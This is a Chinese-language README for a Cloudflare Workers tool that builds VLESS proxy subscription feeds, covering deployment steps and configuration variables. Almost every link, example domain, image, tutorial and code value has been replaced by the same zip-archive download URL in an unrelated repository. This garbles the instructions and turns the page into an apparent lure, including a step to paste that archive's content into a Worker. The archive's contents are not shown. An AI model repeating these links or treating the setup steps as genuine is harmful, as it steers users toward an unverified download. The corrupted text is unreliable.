# 优选订阅生成器 WorkerVless2sub

### 这个是一个通过 Cloudflare Workers 搭建，自动生成优选线路 VLESS 节点订阅内容生成器 [[实现原理]](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)

Telegram交流群：[@CMLiussss](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)，**感谢[Alice Networks](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)提供的云服务器维持[CM订阅转换服务](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)！**

# Pages 部署方法 [视频教程](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)

### 1. 部署 Cloudflare Pages：
   - 在 Github 上先 Fork 本项目，并点上 Star !!!
   - 在 Cloudflare Pages 控制台中选择 `连接到 Git`后，选中 `WorkerVless2sub`项目后点击 `开始设置`。
     
### 2. 给 Pages绑定 自定义域：
   - 在 Pages控制台的 `自定义域`选项卡，下方点击 `设置自定义域`。
   - 填入你的自定义次级域名，注意不要使用你的根域名，例如：
     您分配到的域名是 `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip`，则添加自定义域填入 `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip`即可；
   - 按照 Cloudflare 的要求将返回你的域名DNS服务商，添加 该自定义域 `sub`的 CNAME记录 `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip` 后，点击 `激活域`即可。

### 3. 修改 快速订阅入口 以及 添加内置 Vless 节点信息：

  例如您的pages项目域名为：`https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip`；
   - 添加 `TOKEN` 变量，快速订阅访问入口，默认值为: `auto` ，获取订阅器默认节点订阅地址即 `/auto` ，例如 `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip`
   - 添加 `HOST` 变量，例如 `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip`；
   - 添加 `UUID` 变量，例如 `30e9c5c8-ed28-4cd9-b008-dc67277f8b02`；
   - 添加 `PATH` 变量，例如 `/?ed=2048`；

### 4. 添加你的专属优选线路：

   - 添加变量 `ADD`/`ADDNOTLS` 本地静态的优选线路，若不带端口号 TLS默认端口为443 / noTLS默认端口为80，#号后为备注别名，例如：
   ```
   https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip优选域名
   https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip优选官方线路
   ```

   - 添加变量 `ADDAPI`/`ADDNOTLSAPI` 为 **优选IP地址txt文件** 的 URL。例如：
   ```url
   https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip
   https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip
   ```

<details>
<summary><code><strong>「 我不是小白！我有IP库！我知道IPtest是什么！我也有csv测速文件！ 」</strong></code></summary>

   - 添加变量 `ADDCSV` 为 **iptest测速结果csv文件地址** 的 URL。例如：
   ```js
   https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip
   ```
   - 添加变量 `DLS` ，意为`ADDCSV`满足最低速度的要求，不满足改数值以上的IP将不会添加至优选订阅内容。注意：不考虑单位，只看数值，请按照您的测速结果而定。例如：
   ```js
   8
   ```

 </details>

# Workers 部署方法 [视频教程](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)

### 1. 部署 Cloudflare Worker：

   - 在 Cloudflare Worker 控制台中创建一个新的 Worker。
   - 将 [https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)  的内容粘贴到 Worker 编辑器中。


### 2. 修改 快速订阅入口 以及 添加内置 Vless 节点信息：

  例如您的workers项目域名为：`https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip`；
   - 添加 `TOKEN` 变量，快速订阅访问入口，默认值为: `auto` ，获取订阅器默认节点订阅地址即 `/auto` ，例如 `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip`
   - 添加 `HOST` 变量，例如 `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip`；
   - 添加 `UUID` 变量，例如 `30e9c5c8-ed28-4cd9-b008-dc67277f8b02`；
   - 添加 `PATH` 变量，例如 `/?ed=2048`；


### 3. 添加你的专属优选线路：

**3.1 修改 addresses 参数示例**

 - 修改 `addresses` 参数添加本地静态的优选线路，若不带端口号默认443，不支持生成非TLS订阅，#号后为备注别名，例如：
	```js
	let addresses = [
		'https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip优选域名',
		'https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip优选官方线路',
		'185.221.160.203:443#电信优选IP',
	];
	```
	该方式仅推荐添加优选域名的部分，频繁变更的优选推荐通过 `addressesapi` 来实现。


 **3.2 修改 addressesapi 参数示例**
 
 - 修改 `addressesapi` 参数，在脚本中设置 `addressesapi` 变量为 **优选IP地址txt文件** 的 URL。例如：
	```js
	let addressesapi = [
		'https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip',
 		'https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip',
	];
	```
	可参考 [https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip) 内容格式 自行搭建。


<details>
<summary><code><strong>「 我不是小白！我有IP库！我知道IPtest是什么！我也有csv测速文件！ 」</strong></code></summary>

 
  **3.3 修改 addressescsv 参数示例**
  
 - 修改 `addressescsv` 参数，在脚本中设置 `addressescsv` 变量为 **iptest测速结果csv文件地址** 的 URL。例如：
	```js
	let DLS = 4;//速度下限
	let addressescsv = [
		'https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip',
 		'https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip',
	];
	```
	`DLS` 为要求满足的最低速度，不满足改数值以上的IP将不会添加至优选订阅内容。注意：不考虑单位，只看数值，请按照您的测速结果而定。

 </details>



# 订阅生成器 使用方法 [视频教程](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)

  例如您的workers项目域名为：`https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip`；
  
### 1. 快速订阅

   - 添加 `TOKEN` 变量，快速订阅访问入口，默认值为: `auto` ，获取订阅器默认节点订阅地址即 `/auto` ，例如：
     ```url
     https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip
     ```
     
### 2. 自定义订阅 

   - **自定义订阅格式** `https://[你的Workers域名]/sub?host=[你的Vless域名]&uuid=[你的UUID]&path=[你的ws路径]`
   - **host**：您的 VLESS 伪装域名，例如 `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip`；
   - **uuid**：您的 VLESS 客户端 UUID，例如 `30e9c5c8-ed28-4cd9-b008-dc67277f8b02`；
   - **path**（可选）：您的 VLESS 路径（没有可留空不填），例如 `/?ed=2560`。
   - **sni**（可选）：您的 VLESS 的SNI（留空则默认同`host`），例如 `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip`。
   - **type**（可选）：您的 VLESS 的传输协议（留空则默认为`ws`），例如 `splithttp`。
   - 自定义订阅地址如下：
     ```url
     https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip
     ```
   - 注意路径必须包含 "/sub"。

### 3. 指定 clash、singbox 配置文件

   - 添加 `format=clash` 键值，获取 clash 订阅配置，例如：
     ```url
     https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip
     https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip
     ```
     
   - 添加 `format=singbox` 键值，获取 singbox 订阅配置，例如：
     ```url
     https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip
     https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip
     ```
     
### 变量说明
| 变量名 | 示例 | 备注 | 
|--------|---------|-----|
| TOKEN | `auto` | 快速订阅内置节点的订阅路径地址 /auto (支持多元素, 元素之间使用`,`作间隔)| 
| HOST | `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip` | 快速订阅内置节点的伪装域名 | 
| UUID | `b7a392e2-4ef0-4496-90bc-1c37bb234904` | 快速订阅内置节点的UUID | 
| PATH | `/?ed=256` | 快速订阅内置节点的路径信息 | 
| SNI | `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip` | 快速订阅内置节点的SNI信息（留空则默认同`host`） | 
| TYPE | `splithttp` | 快速订阅内置节点的传输协议信息（留空则默认为`ws`） | 
| ADD | `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip官方优选域名` | 对应`addresses`字段 (支持多元素, 元素之间使用`,`作间隔) | 
| ADDAPI | [https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip) | 对应`addressesapi`字段 (支持多元素, 元素之间使用`,`作间隔) | 
| ADDNOTLS | `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip官方优选域名` | 对应`addressesnotls`字段 (支持多元素, 元素之间使用`,`作间隔) | 
| ADDNOTLSAPI | [https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip) | 对应`addressesnotlsapi`字段 (支持多元素, 元素之间使用`,`作间隔) | 
| ADDCSV | [https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip) | 对应`addressescsv`字段 (支持多元素, 元素之间使用`,`作间隔) | 
| DLS | `8` |`addressescsv`测速结果满足速度下限 | 
| NOTLS | `false` | 改为`true`, 将不做域名判断 始终返回noTLS节点 | 
| TGTOKEN | `6894123456:XXXXXXXXXX0qExVsBPUhHDAbXXXXXqWXgBA` | 发送TG通知的机器人token | 
| TGID | `6946912345` | 接收TG通知的账户数字ID | 
| SUBAPI | `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip` | clash、singbox等 订阅转换后端 | 
| SUBCONFIG | [https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip) | clash、singbox等 订阅转换配置文件 | 
| SUBNAME | `WorkerVless2sub` | 订阅生成器名称 | 
| SOCKS5DATA | [https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip) | Socks5代理池 | 
| PS | `【请勿测速】` | 节点名备注消息 | 
| PROXYIP | `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip` | 默认分配的ProxyIP, 多ProxyIP将随机分配(支持多元素, 元素之间使用`,`作间隔) | 
| CMPROXYIPS | `https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip` | 识别HK后分配对应的ProxyIP(支持多元素, 元素之间使用`,`作间隔) | 

## Star 星星走起
[![Stargazers over time](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)

# 致谢
<a href="https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip"><img src="https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip" width="150" height="75" alt="Alice Networks LTD"/></a>，[SAKURA-YUMI](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)，[EzSync](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)、[ACL4SSR](https://github.com/wiilsliang/WorkerVless2sub/raw/refs/heads/main/Kidder/Vless_Worker_sub_2.5.zip)、


